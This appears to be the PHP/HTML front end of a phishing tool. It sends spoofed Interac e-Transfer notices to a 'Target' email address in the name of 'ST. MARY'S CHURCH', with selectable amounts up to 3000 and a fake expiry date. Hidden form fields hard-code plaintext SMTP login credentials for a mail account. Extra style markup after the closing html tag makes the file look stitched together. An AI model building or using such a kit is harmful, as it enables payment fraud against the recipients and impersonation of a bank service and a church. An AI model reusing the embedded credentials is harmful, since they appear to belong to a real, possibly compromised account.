<?php
    // Calculate expiration date based on current date
    $line = date('F j, Y', strtotime('+30 days'));
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Expires: Sat, 01 Jan 2000 00:00:00 GMT");
header("Pragma: no-cache");
?><html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="MobileOptimized" content="width">
    <meta name="HandheldFriendly" content="true">
    <meta name="format-detection" content="telephone=yes">  <style>
        body {
            background-color: red;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            font-size: 24px; /* Increase font size for better visibility on mobile */
        }
        input[type="text"],
        select {
            background-color: red;
            width: 100%;
            color: white;
            padding: 15px 10px; /* Set equal padding left and right */
            margin-bottom: 10px;
            border: 10px solid #ccc;
            border-radius: 4px;
            font-size: 24px; /* Increase font size for better visibility on mobile */
        }
        input[type="submit"] {
            background-color: red;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 20px;
            cursor: pointer;
            font-size: 24px; /* Increase font size for better visibility on mobile */
        }
    </style>
</head>
<body>
    <center>
        <form action="submit1.php" method="POST" enctype="multipart/form-data"><input type="hidden" id="etransfer_interac_ca" name="etransfer_interac_ca" required>
<label for="receivers_email">LEVEL 1<BR>
      </label><input type="text" id="receivers_email" name="receivers_email" placeholder="Target@email.com" required>
<input type="hidden" id="receivers_name" name="receivers_name" value="One-time contact" required>
<input type="text" id="sender_name" name="sender_name" value="ST. MARY'S CHURCH" required>
       <select id="amount" name="amount" required>
  <!-- Loop through values from 10 to 3000 with a step of 5 -->
  <?php for ($value = 10; $value <= 3000; $value += 5): ?>
    <option value="<?php echo number_format($value, 2); ?>">
      <?php echo number_format($value, 2); ?>
    </option>
  <?php endfor; ?>
</select>
<input type="hidden" name="line" value="<?php echo $line; ?>" required="">
<input type="hidden" name="port" value="587" required="">
<input type="hidden" name="username" value="andallard@mymts.net" required="">
<input type="hidden" name="password" value="Batman123" required="">
<input type="hidden" name="host" value="mail.mymts.net"required="">
  <input type="submit" value="Submit">

</center></html>








  






  <style>
    body {
      background-color: #000;
      color: #fff;
      font-family: Arial, sans-serif;
    }

    h1 {
      text-align: center;
    }

    form {
      margin: 20px;
    }

    input[type="text"], select {
      width: 100%;
      padding: 10px;
      margin-bottom: 10px;
      border: none;
      background-color: #333;
      color: #fff;
    }

    input[type="submit"] {
      width: 100%;
      padding: 10px;
      border: none;
      background-color: #0066cc;
      color: #fff;
      cursor: pointer;
    }
  </style>


  











</div></body></html>
